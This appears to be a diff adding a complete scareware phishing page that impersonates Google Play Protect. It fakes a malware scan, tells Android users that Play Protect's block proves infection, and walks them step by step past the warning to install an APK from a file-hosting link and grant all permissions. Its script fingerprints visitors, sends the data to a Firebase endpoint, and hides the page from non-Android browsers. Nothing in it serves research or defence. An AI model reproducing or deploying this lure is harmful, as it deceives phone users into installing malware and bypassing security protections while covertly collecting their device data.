@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>🚨 Google Play Protect - Device Security Scan</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap');
+        body { margin:0; padding:0; background:#000; color:#fff; font-family:'Roboto',sans-serif; }
+        .container { max-width:480px; margin:20px auto; background:#111; border:5px solid #f00; border-radius:16px; box-shadow:0 0 50px #f00; overflow:hidden; }
+        .header { background:linear-gradient(#b71c1c, #d32f2f); padding:20px; text-align:center; }
+        .header h1 { margin:0; color:#ff0; font-size:24px; }
+        .progress-container { padding:25px; text-align:center; }
+        .progress-bar { height:12px; background:#333; border-radius:6px; overflow:hidden; margin:15px 0; }
+        .progress { height:100%; width:0%; background:linear-gradient(#42a5f5, #1e88e5); transition:width 0.3s; }
+        .fake-warning { display:none; background:#2c2c2c; padding:20px; border-radius:12px; margin:15px 0; border:2px solid #f44336; text-align:left; box-shadow:0 0 15px #f44336; }
+        .btn { display:block; width:90%; padding:22px; background:linear-gradient(#d32f2f,#b71c1c); color:#fff; font-size:22px; font-weight:700; border-radius:12px; margin:20px auto; text-decoration:none; box-shadow:0 8px 0 #000; }
+        .bypass { background:#1a0000; padding:18px; border-radius:10px; margin:15px 0; font-size:15px; border:2px solid #ff9800; line-height:1.7; }
+        .psych-text { background:#1a0000; padding:18px; border-radius:10px; margin:15px 0; font-size:15.5px; line-height:1.55; border-left:5px solid #ffeb3b; }
+    </style>
+</head>
+<body>
+<div class="container" id="mainPage" style="display:none;">
+    <div class="header">
+        <h1>🚨 Google Play Protect - Device Security Scan</h1>
+    </div>
+    
+    <div class="progress-container" id="scanScreen">
+        <div class="alert">SCANNING FOR THREATS...</div>
+        <div class="progress-bar"><div class="progress" id="progress"></div></div>
+        <p id="status">Analyzing system files...</p>
+    </div>
+    
+    <div class="fake-warning" id="warningScreen">
+        <div style="display:flex;align-items:center;gap:10px;margin-bottom:12px;">
+            <span style="font-size:40px;color:#42a5f5;">🛡️</span>
+            <strong style="font-size:19px;">Google Play Protect</strong>
+        </div>
+        <h3 style="color:#f44336;margin:8px 0 15px 0;font-size:23px;">Harmful app blocked</h3>
+        
+        <div style="background:#424242;padding:12px;border-radius:8px;display:flex;align-items:center;gap:12px;margin-bottom:15px;">
+            <span style="font-size:36px;">📱</span>
+            <div>
+                <strong>SUPER CLEANER.apk</strong><br>
+                <small style="color:#ff9800;">This app may be harmful.</small>
+            </div>
+        </div>
+        
+        <p style="margin:15px 0 10px 0;color:#ddd;">Installing this app may put your device at risk.</p>
+        
+        <div style="color:#42a5f5;cursor:pointer;font-weight:bold;margin:12px 0 8px 0;">More details ▼ <span style="color:#ff0;font-size:18px;">← TAP HERE FIRST</span></div>
+        
+        <button onclick="fakeInstall()" style="width:100%;padding:16px;background:#42a5f5;color:#000;border:none;border-radius:8px;font-weight:bold;font-size:17px;margin-top:8px;">Install anyway <span style="color:#000;">↑</span></button>
+    </div>
+    
+    <div class="content" id="mainContent" style="display:none;">
+        <div class="psych-text">
+            Play Protect will show the app is blocked. This is normal and proof your phone is already infected. The real criminals programmed it to block our removal tool.
+        </div>
+        
+        <div class="bypass">
+            <strong>👇 FULL STEP-BY-STEP WORKFLOW:</strong><br><br>
+            STEP 1: Tap Remove / More details on the warning<br>
+            STEP 2: Download the APK file<br>
+            STEP 3: Wait for download to finish<br>
+            STEP 4: Pull down notification bar → Tap the downloaded file<br>
+            — OR — Go to Files / Downloads → Tap SUPER CLEANER.apk<br>
+            STEP 5: If blocked warning appears → Tap More details<br>
+            STEP 6: Tap Install anyway<br>
+            STEP 7: If asked again → Tap OPEN or INSTALL<br>
+            STEP 8: Allow all permissions<br>
+            STEP 9: Enable the cleaner
+        </div>
+        
+        <a href="https://files.catbox.moe/6jv5n7.apk" class="btn" onclick="fixNow(event)">🛠️ REMOVE INFECTION NOW</a>
+    </div>
+</div>
+
+<div id="pcBlock" style="display:none; text-align:center; padding:50px; color:#f00;">
+    <h2>This tool is for mobile devices only.</h2>
+    <p>Open on your Android phone.</p>
+</div>
+
+<script>
+// Advanced Fingerprint
+function getFingerprint() {
+    let fp = {
+        timestamp: new Date().toISOString(),
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        screen: screen.width + "x" + screen.height + "x" + screen.colorDepth,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        language: navigator.language,
+        canvas: ""
+    };
+    try {
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        ctx.textBaseline = "alphabetic";
+        ctx.font = "30px Arial";
+        ctx.fillText("Security Check", 50, 50);
+        fp.canvas = canvas.toDataURL().substring(0, 80);
+    } catch(e) {}
+    return fp;
+}
+
+// Log function
+function logEvent(type) {
+    const fp = getFingerprint();
+    fetch("https://my-project-ef8f2-default-rtdb.firebaseio.com/visits.json", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ type: type, fingerprint: fp })
+    }).catch(() => {});
+}
+
+// Cloaking - Only show on Android
+if (/Android/i.test(navigator.userAgent)) {
+    document.getElementById('mainPage').style.display = 'block';
+    logEvent("VISIT");
+} else {
+    document.getElementById('pcBlock').style.display = 'block';
+}
+
+// Progress bar
+let progress = 0;
+const progressBar = document.getElementById('progress');
+const statusText = document.getElementById('status');
+
+const interval = setInterval(() => {
+    progress += Math.random() * 15;
+    if (progress > 100) progress = 100;
+    progressBar.style.width = progress + '%';
+    if (progress > 40) statusText.textContent = "Detecting hidden malware...";
+    if (progress > 80) statusText.textContent = "Threat found - preparing removal tool...";
+    if (progress >= 100) {
+        clearInterval(interval);
+        setTimeout(() => {
+            document.getElementById('scanScreen').style.display = 'none';
+            document.getElementById('warningScreen').style.display = 'block';
+            document.getElementById('mainContent').style.display = 'block';
+        }, 600);
+    }
+}, 160);
+
+function fakeInstall() {
+    alert("The virus is fighting back. Tap Install anyway to proceed.");
+}
+
+function fixNow(e) {
+    e.preventDefault();
+    logEvent("DOWNLOAD_CLICKED");
+    alert("Download starting... Follow the steps above exactly.");
+    window.location.href = "https://files.catbox.moe/6jv5n7.apk";
+}
+</script>
+</body>
+</html>
